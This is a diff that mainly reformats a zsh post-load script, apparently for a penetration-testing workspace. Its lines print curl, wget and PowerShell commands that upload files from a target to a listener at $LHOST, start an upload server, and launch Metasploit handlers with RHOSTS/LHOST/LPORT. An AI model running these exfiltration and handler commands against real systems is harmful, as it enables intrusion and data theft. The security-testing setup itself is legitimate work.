@@ -1,19 +1,19 @@
 # POST executed after the shell is loaded
 # This file is loaded after .zshrc
 
-# you can define any functions,settings,automation here. 
+# you can define any functions,settings,automation here.
 
 source ${PROJECT_FOLDER}/.vscode/env.zsh
 
 if [ "$WEB_DELIVERY_MODE" ]; then
     if [ -z "$PROJECT_WEB_DELIVERY" ]; then
         echo "PROJECT_WEB_DELIVERY is not set. Please set it in .vscode/env.zsh"
-    else 
+    else
         if [ -d "$PROJECT_WEB_DELIVERY" ]; then
             echo "FOLDER $PROJECT_WEB_DELIVERY exists."
         else
             mkdir -p $PROJECT_WEB_DELIVERY
-            echo "*" > $PROJECT_WEB_DELIVERY/.gitignore
+            echo "*" >$PROJECT_WEB_DELIVERY/.gitignore
             echo "FOLDER $PROJECT_WEB_DELIVERY created."
         fi
     fi
@@ -45,7 +45,7 @@ if [ "$WEB_DELIVERY_MODE" ]; then
     echo "curl http://$LHOST:$LISTEN_ON/uploadfile --upload-file filename"
     echo "curl http://$LHOST:$LISTEN_ON/uploadfile -T filename"
     echo "wget --output-document - --method=PUT http://$LHOST:$LISTEN_ON/uploadfile --body-file=filename"
-    echo "invoke-webrequest -Uri http://$LHOST:$LISTEN_ON/uploadfile -Method PUT -InFile filename" 
+    echo "invoke-webrequest -Uri http://$LHOST:$LISTEN_ON/uploadfile -Method PUT -InFile filename"
     echo "=============================================================================================="
     echo "PS: If your terminal can't display this notes properly, you need resize your terminal window."
     echo ""
@@ -53,14 +53,12 @@ if [ "$WEB_DELIVERY_MODE" ]; then
     simplehttpserver -listen 0.0.0.0:$LISTEN_ON -verbose -upload
     # python3 -m http.server $LISTEN_ON
     exit 0
-fi 
-
+fi
 
 export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg RHOSTS $RHOST;"
 export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LHOST $LHOST;"
 export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LPORT $LPORT;"
 export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg VHOST $DOMAIN;"
-
 
 if [ "$METASPLOIT_HANDLER_MODE" ]; then
     msfconsole -r "$PROJECT_FOLDER/.vscode/metasploit_handler.rc" \
@@ -68,7 +66,7 @@ if [ "$METASPLOIT_HANDLER_MODE" ]; then
     exit 0
 fi
 
-if [ "$METASPLOIT_CONSOLE_MODE" ]; then 
+if [ "$METASPLOIT_CONSOLE_MODE" ]; then
     msfconsole -r "$PROJECT_FOLDER/.vscode/msfconsole.rc" \
         -x "${METASPLOIT_INIT_COMMAND}"
     exit 0
@@ -89,7 +87,7 @@ fi
 
 # Start the virtual environment if exists
 if [ -d "$PROJECT_FOLDER/venv" ]; then
-    if [ -n "${VIRTUAL_ENV}" ];then 
+    if [ -n "${VIRTUAL_ENV}" ]; then
         # sliently deactivate the virtual environment
 
         # echo "Virtual Environment is already activated."
@@ -97,37 +95,32 @@ if [ -d "$PROJECT_FOLDER/venv" ]; then
         # echo "Trying to deactivate the virtual environment automatically."
 
         # force deactivate the virtual environment
-        if [ -n "${_OLD_VIRTUAL_PATH:-}" ]
-        then
-                PATH="${_OLD_VIRTUAL_PATH:-}" 
-                export PATH
-                unset _OLD_VIRTUAL_PATH
+        if [ -n "${_OLD_VIRTUAL_PATH:-}" ]; then
+            PATH="${_OLD_VIRTUAL_PATH:-}"
+            export PATH
+            unset _OLD_VIRTUAL_PATH
         fi
-        if [ -n "${_OLD_VIRTUAL_PYTHONHOME:-}" ]
-        then
-                PYTHONHOME="${_OLD_VIRTUAL_PYTHONHOME:-}" 
-                export PYTHONHOME
-                unset _OLD_VIRTUAL_PYTHONHOME
+        if [ -n "${_OLD_VIRTUAL_PYTHONHOME:-}" ]; then
+            PYTHONHOME="${_OLD_VIRTUAL_PYTHONHOME:-}"
+            export PYTHONHOME
+            unset _OLD_VIRTUAL_PYTHONHOME
         fi
-        if [ -n "${BASH:-}" -o -n "${ZSH_VERSION:-}" ]
-        then
-                hash -r 2> /dev/null
+        if [ -n "${BASH:-}" -o -n "${ZSH_VERSION:-}" ]; then
+            hash -r 2>/dev/null
         fi
-        if [ -n "${_OLD_VIRTUAL_PS1:-}" ]
-        then
-                PS1="${_OLD_VIRTUAL_PS1:-}" 
-                export PS1
-                unset _OLD_VIRTUAL_PS1
+        if [ -n "${_OLD_VIRTUAL_PS1:-}" ]; then
+            PS1="${_OLD_VIRTUAL_PS1:-}"
+            export PS1
+            unset _OLD_VIRTUAL_PS1
         fi
         unset VIRTUAL_ENV
         unset VIRTUAL_ENV_PROMPT
-        if [ ! "${1:-}" = "nondestructive" ]
-        then
+        if [ ! "${1:-}" = "nondestructive" ]; then
             # deactivate always useless here
             # unset -f deactivate
         fi
     fi
-    
+
     source $PROJECT_FOLDER/venv/bin/activate
 fi
 
@@ -144,13 +137,13 @@ setopt inc_append_history
 setopt share_history
 setopt hist_save_no_dups
 setopt histignorealldups
-setopt EXTENDED_HISTORY # with timestamp
-fc -R -I ${OLD_HISTFILE} # loading the old histfile 
+setopt EXTENDED_HISTORY  # with timestamp
+fc -R -I ${OLD_HISTFILE} # loading the old histfile
 
-if [[ "$HIST_COMMAND_INDEXER" != "" ]]; then 
+if [[ "$HIST_COMMAND_INDEXER" != "" ]]; then
     if [[ ! -f ${HIST_COMMAND_INDEXER} ]]; then
         echo "HIST_COMMAND_INDEXER file not found: ${HIST_COMMAND_INDEXER}"
-    else 
+    else
         fc -R -I ${HIST_COMMAND_INDEXER} # loading the command indexer
     fi
-fi 
+fi
